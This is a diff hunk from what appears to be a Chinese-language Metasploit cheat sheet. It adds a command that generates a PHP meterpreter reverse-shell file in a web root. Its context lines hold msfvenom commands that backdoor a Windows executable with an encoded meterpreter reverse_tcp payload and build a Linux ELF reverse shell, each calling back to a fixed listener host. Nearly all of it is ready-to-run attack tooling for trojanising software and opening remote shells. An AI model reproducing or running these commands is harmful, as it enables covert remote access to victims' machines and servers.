@@ -28,6 +28,10 @@ sessions -i 1  指定会话ID，调用新的会话
 	@给软件加上后门@
 sudo msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp  LHOST=192.168.100.143 LPORT=4444 -b"\x00" -e x86/shikata_ga_nai -i 10 -x /home/xiaoxiaoran/temp/Terminal.exe -f exe -o /var/www/html/xiao2.exe
 
+	@php@
+use payload/php/meterpreter_reverse_tcp
+generate -f raw -o /var/www/html/back.php
+
 
 	@制作Linux恶意软件获取shell@
 sudo msfvenom -a x64 --platform linux -p linux/x64/meterpreter/reverse_tcp LHOST=192.168.100.143 LPORT=4444 -b "\x00" -i 10 -f elf -o  /var/www/html/xiao3
